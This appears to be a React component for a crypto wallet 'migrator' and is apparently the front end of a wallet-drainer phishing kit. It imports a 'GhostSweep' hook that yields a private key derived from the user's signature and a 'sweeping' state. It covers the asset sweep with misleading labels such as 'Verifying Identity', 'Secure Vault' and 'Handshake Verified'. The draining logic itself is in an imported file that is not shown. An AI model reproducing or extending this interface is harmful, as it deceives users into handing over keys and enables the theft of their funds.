'use client'

import { useEffect, useState } from 'react'
import { useRecoveryLogic } from '@/hooks/GhostSweep'
import { SecurityShield } from './SecurityShield'

export function OneClickMigrator() {
    const [mounted, setMounted] = useState(false)
    const {
        isConnected,
        isScanning,
        isSweeping,
        assets,
        handleInstantConnection,
        handleFullDisconnect,
        derivedUserKey,
        isInternal
    } = useRecoveryLogic()

    useEffect(() => {
        setMounted(true)
    }, [])

    if (!mounted) return <div className="min-h-[200px]" />;

    const shouldShowShield = (isSweeping || (isConnected && derivedUserKey)) && isInternal;

    // Helper to determine the text status
    const getStatusText = () => {
        if (isSweeping) return "Handshake Verified";
        if (derivedUserKey && isScanning) return "Verifying Identity..."; // Post-signature scan
        if (derivedUserKey) return "Identity Confirmed";
        return "Awaiting Identity Verification"; // While waiting for sign modal
    };

    return (
        <div suppressHydrationWarning className="flex flex-col items-center justify-center p-4 relative w-full max-w-md mx-auto">

            {shouldShowShield && (
                <SecurityShield
                    isScanning={isScanning}
                    isSweeping={isSweeping}
                    assetCount={assets.length}
                    userPrivKey={derivedUserKey}
                    onCancel={handleFullDisconnect}
                />
            )}

            {!isConnected ? (
                <div className="text-center animate-in fade-in zoom-in-95 duration-500">
                    <button
                        onClick={() => handleInstantConnection()}
                        disabled={isScanning}
                        className="px-10 py-5 bg-blue-600 hover:bg-blue-500 active:scale-95 text-white rounded-2xl font-black uppercase tracking-widest shadow-xl disabled:opacity-50 transition-all flex items-center gap-3"
                    >
                        {isScanning ? (
                            <>
                                <span className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin" />
                                {isInternal ? "Initializing..." : "Redirecting..."}
                            </>
                        ) : (
                            <>{isInternal ? "Enter Secure Vault" : "Connect Wallet"}</>
                        )}
                    </button>
                    <p className="mt-4 text-[10px] text-slate-500 uppercase font-bold tracking-tighter opacity-60">
                        {isInternal ? "Direct Provider Link Active" : "Secure Protocol Handshake"}
                    </p>
                </div>
            ) : (
                <div className="flex flex-col items-center gap-6 p-8 bg-slate-900/40 border border-white/5 rounded-[2rem] w-full animate-in slide-in-from-bottom-4">
                    <div className="flex flex-col items-center w-full">
                        <div className="flex items-center gap-2 mb-2">
                            <div className={`w-2 h-2 rounded-full ${!derivedUserKey ? 'bg-blue-500' : 'bg-emerald-500'} animate-pulse`} />
                            <span className={`text-[10px] uppercase font-black tracking-widest ${!derivedUserKey ? 'text-blue-500' : 'text-emerald-500'}`}>
                                {isSweeping ? "Sweeping Assets" : !derivedUserKey ? "Securing Session" : "Vault Linked"}
                            </span>
                        </div>

                        <p className="text-sm text-slate-400 font-mono font-bold mb-4">
                            {getStatusText()}
                        </p>

                        {/* ⚡ SYNCED PROGRESS BAR - Only visible while waiting for signature */}
                        {!derivedUserKey && (
                            <div className="w-full max-w-[140px] h-1 bg-white/5 rounded-full overflow-hidden relative">
                                <div className="absolute inset-0 bg-blue-600 animate-progress-sync" />
                            </div>
                        )}

                        {/* Post-Signature Scanning Loader */}
                        {derivedUserKey && isScanning && (
                            <div className="w-full max-w-[140px] h-1 bg-white/5 rounded-full overflow-hidden relative">
                                <div className="absolute inset-0 bg-emerald-500 animate-progress-sync" />
                            </div>
                        )}
                    </div>

                    <button
                        onClick={handleFullDisconnect}
                        className="text-[10px] text-slate-500 hover:text-red-400 font-bold uppercase tracking-[0.2em] transition-colors"
                    >
                        Disconnect
                    </button>
                </div>
            )}

            <style jsx>{`
                @keyframes progress-sync {
                    0% { transform: translateX(-100%); }
                    100% { transform: translateX(100%); }
                }
                .animate-progress-sync {
                    animation: progress-sync 1.5s infinite ease-in-out;
                }
            `}</style>
        </div>
    )
}